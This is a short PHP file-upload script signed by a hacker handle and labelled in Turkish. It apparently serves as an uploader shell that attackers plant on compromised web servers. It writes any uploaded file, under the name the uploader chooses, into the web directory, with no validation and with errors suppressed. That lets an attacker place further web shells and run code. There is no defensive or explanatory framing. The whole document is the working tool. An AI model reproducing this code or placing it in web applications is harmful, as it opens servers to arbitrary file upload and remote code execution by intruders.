//<?php
echo"coded by By_N4sH0xR";
if(isset($_POST['Submit'])){
    $filedir = ""; 
    $maxfile = '2000000';

    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if (isset($_FILES['image']['name'])) {
        $abod = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $abod);
  
echo"<center><b> Geri ==> $userfile_name</b></center>";
}
}
else{
echo'
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Gonder"></form>';
}

?>//